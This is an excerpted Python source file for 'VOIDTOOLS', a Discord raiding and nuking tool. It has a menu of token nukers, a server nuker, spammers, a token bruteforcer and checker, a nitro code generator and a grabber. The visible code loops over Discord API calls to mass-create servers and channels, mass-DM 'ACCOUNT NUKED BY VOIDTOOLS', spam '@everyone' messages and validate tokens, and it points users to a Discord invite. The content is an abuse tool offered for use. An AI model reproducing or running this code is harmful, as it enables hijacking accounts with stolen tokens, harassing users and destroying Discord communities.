...
def options1():
  ...
  ctypes.windll.kernel32.SetConsoleTitleW("VOIDTOOLS")
  print(f'''
  {Fore.MAGENTA}                        	██╗   ██╗ ██████╗ ██╗██████╗ ████████╗ ██████╗  ██████╗ ██╗     ███████╗ 
  {Fore.MAGENTA}                        	██║   ██║██╔═══██╗██║██╔══██╗╚══██╔══╝██╔═══██╗██╔═══██╗██║     ██╔════╝
  {Fore.MAGENTA}                        	╚██╗ ██╔╝██║   ██║██║██║  ██║   ██║   ██║   ██║██║   ██║██║     ╚════██║
  ...
  {Fore.MAGENTA}                        	  ╚═══╝   ╚═════╝ ╚═╝╚═════╝    ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝╚══════╝''')
  print(Fore.MAGENTA + '╔══════════════════════════════╦══════════════════════════╦══════════════════════════════╦══════════════════════════╗')
  print(Fore.MAGENTA +f'║     {Fore.MAGENTA}RAIDING/NUKING           {Fore.MAGENTA}║     {Fore.MAGENTA}GENERATORS           {Fore.MAGENTA}║     {Fore.MAGENTA}EXTRAS                   {Fore.MAGENTA}║     {Fore.MAGENTA}CREDITS             {Fore.MAGENTA} ║')
  print(Fore.MAGENTA + '║     [01] TOKEN JOINER        ║     [09] TOKENS          ║     [15] TOKEN BRUTEFORCER   ║     [21] DISCORD         ║')
  print(Fore.MAGENTA +    '║     [02] AIO WEBHOOK RAIDERS ║     [10] NITRO           ║     [16] TOKEN CHECKER       ║                          ║')
  print(Fore.MAGENTA +    '║     [03] AIO TOKEN NUKERS    ║     [11] PROXY           ║     [17] HYPEQUAD CHANGER    ║                          ║')
  print(Fore.MAGENTA +    '║     [04] SERVER NUKER        ║     [12] GRABBER         ║     [18] TOKEN INFO          ║                          ║')
  print(Fore.MAGENTA+     '║     [05] SERVER SPAMMER      ║     [13] MEMBER IDS      ║     [19] TOKEN LOGIN         ║                          ║')
  print(Fore.MAGENTA +    '║     [06] FRIEND SPAMMER      ║     [14] NAMES           ║     [20] EXIT                ║                          ║')
  print(Fore.MAGENTA +    '║     [07] ONLINER             ║                          ║                              ║                          ║')
  print(Fore.MAGENTA +f'║     [08] TOKEN LEAVER        ║                          ║                              ║                           ║')
  print(Fore.MAGENTA + '║                              ║                          ║                              ║                          ║')
  print(Fore.MAGENTA + '╚══════════════════════════════╩══════════════════════════╩══════════════════════════════╩══════════════════════════╝')
  global options
...
{Fore.MAGENTA}   | | (_) |   <  __/ | | | | |\  | |_| |   <  __/ |  \__ |
   ...
   [06] {Fore.RESET}{Fore.MAGENTA}TOTAL KARNAGE{Fore.RESET}
   {Fore.MAGENTA}[07] EXIT
...
{Fore.MAGENTA} | |  | | (_| \__ \__ \ | |_) | | (_) | (__|   < 
 |_|  |_|\__,_|___/___/ |____/|_|\___/ \___|_|\_\                                              
  ...
  \033[35m  | | (_) |   <  __/ | | | | |\  | |_| |   <  __/ |   
    |_|\___/|_|\_\___|_| |_| |_| \_|\__,_|_|\_\___|_|   
      ...
      def servercreate():
          ...
          for x in range(15):
              try:
                r = requests.post(url,headers=header, json={'name':"Nuked By VOIDTOOLS", 'icon':image})
      ...
      def channelmake():
          ...
          for b in range(length):
              for i in range(15):
                  ...
                  r = requests.post(url1, headers=header, json={'name':'nuked-by-VOIDTOOLS'})
  ...
  {Fore.MAGENTA} ___) |  __/ |   \ V /  __/ |    | |_| |  __/ |  __/ ||  __/ |   
...
{Fore.MAGENTA}  ___) |  __/ |   \ V /  __/ |    | |__|  __/ (_| |\ V /  __/ |   
...
''')
    ...
    {Fore.MAGENTA}   | |_| | |_) | | | ||  __/ | | (_| | ||  __/ 
        ...
        for user in massdms:
          payload = {
            'content':'ACCOUNT NUKED BY VOIDTOOLS'
          }
        ...
        def servercreate():
            ...
            for x in range(15):
                try:
                    r = requests.post(url2,headers=header, json={'name':"Nuked By VOIDTOOLS", 'icon':image})
                    if r.status_code == 200 or 204 or 201:
                        print("Done!")
                        ids.append(r.json()['id'])
                    else:
...
{Fore.MAGENTA}   | | (_) |   <  __/ | | |  | || | | |  _| (_) |
   |_|\___/|_|\_\___|_| |_| |___|_| |_|_|  \___/ 
    ...
    print(f'{Fore.RESET}Profile Picture: {Fore.MAGENTA}{pfp}')
      ...
      if file in yeslist:
        ...
        for x in range(length):
            ...
            if r.status_code == 200:
                ...
                print(f'\033[35m [-] Invalid {token[x]}', )
                invalid += 1

        print(f'{fore.magenta} There are {valid} valid tokens and {invalid} invalid tokens')
...
{Fore.MAGENTA}   \ V  V /  __/ |_) | | | | (_) | (_) |   <  |  _ < (_| | | (_| |  __/ |  \__ |
...
{Fore.MAGENTA}   \ V  V /  __/ |_) | | | | (_) | (_) |   <  | |___| | | |  __/ (__|   <  __/ |   
  ...
  {Fore.MAGENTA} __        __   _     _                 _      ____       _      _            
   \ \      / /__| |__ | |__   ___   ___ | | __ |  _ \  ___| | ___| |_ ___ _ __ 
    \ \ /\ / / _ \ '_ \| '_ \ / _ \ / _ \| |/ / | | | |/ _ \ |/ _ \ __/ _ \ '__|
  {Fore.MAGENTA}   \ V  V /  __/ |_) | | | | (_) | (_) |   <  | |_| |  __/ |  __/ ||  __/ |   
  ...
  {Fore.MAGENTA}   \ V  V /  __/ |_) | | | | (_) | (_) |   <   ___) | |_) | (_| | | | | | | | | | | |  __/ |   
...
{Fore.MAGENTA}   \ V  V /  __/ |_) | | | | (_) | (_) |   <  | |___| | |  __/ (_| | || (_) | |   
    \_/\_/ \___|_.__/|_| |_|\___/ \___/|_|\_\  \____|_|  \___|\__,_|\__\___/|_|   
        ...
        def spammer():
            ...
            for x in range(1):
                ...
                r = requests.post(url,headers=header,json={'name':'Nuked By VOIDTOOLS'})
        ...
        print("Finished! Created 10 webhooks named *Nuked by VOIDTOOLS* and with avatars named *VOIDTOOLS*")
      ...
      {Fore.MAGENTA}   \ V  V /  __/ |_) | | | | (_) | (_) |   <  | |_| |  __/\__ \ |_| | | (_) | |_| |  __/ |   
      ...
      def spammer():
          ...
          for x in range(1):
              ...
              for i in range(length):
                  ...
                  url1 = f'https://discord.com/api/v9/webhooks/{ids[i]}'
                  t = requests.patch(url1,headers=header2,json={'avatar':url2})
                  print("Succefully changed the avatar to a *VOIDTOOLS* for the Webhooks!")
  ...
  def nitro():
    ...
    print(" |  \| | | __| '__/ _ \  | |  _ / _ \ '_ \ ")  
    print("\033[35m | |\  | | |_| | | (_) | | |_| |  __/ | | |")
    print(" |_| \_|_|\__|_|  \___/   \____|\___|_| |_|")  
    print("                                           ")  


    threaad = int(input(Fore.MAGENTA + "How many threads do you want?: "))
        ...
        def nitro():
            ...
            while True:
                ...
                if r.status_code == 200:
                    ...
                    print("\033[35m[-] Invalid ~ {}".format(nitrocode))
   ...
   |_|\___/|_|\_\___|_| |_|  \____|\___|_| |_|
    ...
    if fileask in yeslist:
      ...
      for i in range(howmany111):
        ...
        file.write(result + '\n')
        token.append(result)
      print(fore.magenta + "All tokens are random characters.")
...
{Fore.MAGENTA} | |__| (_) | (_| | | | | |
 |_____\___/ \__, |_|_| |_|
  ...
  {Fore.MAGENTA}  ____  _                       _  
   ...
   | | | | / __|/ __/ _ \\| '__/ _` |
  {Fore.MAGENTA} | |_| | \\__ \\ (_| (_) | | | (_| | 
   |____/|_|___/\\___\\___/|_|  \\__,_| 

      ''')
      input(f"{Fore.MAGENTA}Press Enter to join the Discord Server...")
      webbrowser.open("https://discord.gg/aPZrYSjcbV")
...
{Fore.MAGENTA} | |_) | |  | |_| | ||  __/  _| (_) | | | (_|  __/ |   
 |____/|_|   \__,_|\__\___|_|  \___/|_|  \___\___|_|   

{Fore.MAGENTA} If it stops just click Enter on your keyboard
{Fore.MAGENTA}                                                    
    ''')
    global id_to_token
  ...
  def hypesquad():
    ...
    | |_| | | | | '_ \ / _ \/ __|/ _` | | | |/ _` |/ _` | 
    {Fore.MAGENTA}|  _  | |_| | |_) |  __/\__ \ (_| | |_| | (_| | (_| | 
...
{Fore.MAGENTA} | |  | |  __/ | | | | | |_) |  __/ |     ___) | (__| | | (_| | |_) |  __/ |   
    ...
    class UNuker:
        ...
        def SpamChannels(self, guild, name):
            while True:
                ...
                def sendmessage():
                    e = requests.post(f'https://discord.com/api/v9/channels/{id}/messages',headers=headerrs, json={'content':'@everyone @here NUKED BY VOIDTOOLS'})
        ...
        async def NukeStart(self):
            cls()
            chh = 'nuked-by-VOIDTOOLS'
            cha = input(f"Channel Amount: ")
            rn = 'NUKED BY VOIDTOOLS'
            ...
            e = requests.patch(url, headers=headerrs, json={'name':"Nuked By VOIDTOOLS", 'icon':image})
